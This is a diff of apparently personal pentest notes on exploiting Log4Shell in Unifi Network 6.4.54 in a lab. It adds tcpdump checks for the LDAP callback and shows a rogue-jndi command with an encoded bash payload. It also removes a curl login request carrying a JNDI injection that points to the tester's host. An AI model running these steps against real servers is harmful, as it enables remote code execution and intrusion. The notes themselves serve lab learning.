@@ -12,9 +12,18 @@ description: 'tl;dr: This page tracks things I have pwn''d before with public ex
 
 * Unifi Network 6.4.54
 * [https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi)
-* Testing, capture auth attempt in burp&#x20;
+* Testing, capture auth attempt in burp with creds `test:test`
+* Start `tcpdump` on your host station:
 
+```
+sudo tcpdump -i tun0 port 389
+```
 
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+* The server will response with `invalid payload` however it is still connecting back to us, check `tcpdump` to ensure the connect back&#x20;
+
+![](.gitbook/assets/image.png)
 
 ```
 git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
@@ -23,11 +32,7 @@ java -jar /opt/rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFz
 ```
 
 * `--hostname` is your localhost tun0 interface
-* Once you have completed the set up, run this for your reverse shell&#x20;
-
-```
-curl -i -s -k -X POST -H $'Host: 10.129.117.73:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://10.10.15.96:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.117.73:8443/api/login'
-```
+* &#x20;
 
 
 
